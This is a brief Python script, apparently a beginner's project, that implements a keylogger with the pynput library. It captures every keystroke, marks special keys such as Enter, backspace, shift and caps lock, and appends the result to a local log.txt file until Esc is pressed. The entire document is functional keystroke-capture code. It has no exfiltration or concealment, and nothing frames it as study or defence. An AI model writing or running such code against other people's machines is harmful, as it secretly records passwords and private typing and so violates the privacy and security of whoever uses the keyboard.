import pynput
import sys

from pynput.keyboard import Key, Listener


count = 0
keys = []
caps = False


def on_press(key):
    global keys, count

    count += 1
    keys.append(key)

    if count >= 5:#amount of chars to be writen
        count = 0
        write_file(keys)
        keys = []

    print(key)


#key realease Key.esc, exit listener loop (ends program)
def on_release(key):
    if key == Key.esc:
        return False


#writes to the file log.txt
def write_file(keys):

    global caps
    
    with open("log.txt", "a") as f:
        for key in keys:
            if key == Key.enter:
                f.write('\n')

            elif key == Key.space:
                f.write(' ')

            elif key == Key.backspace:
                f.write('<-')

            elif key == Key.ctrl_l or key == Key.ctrl_r:
                f.write(' ctrl ')

            elif key == Key.shift_l or key == Key.shift_r:
                f.write(' shift ')

            elif key == Key.caps_lock:
                caps = not caps
                if caps:
                    f.write(' /\CAPS/\ ')
                else:
                    f.write(' \/CAPS\/ ')

            else:
                if not caps:
                    f.write(str(key).replace("'", ''))
                else:
                    f.write(str(key).replace("'", '').capitalize())


#Main loop calls functions
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
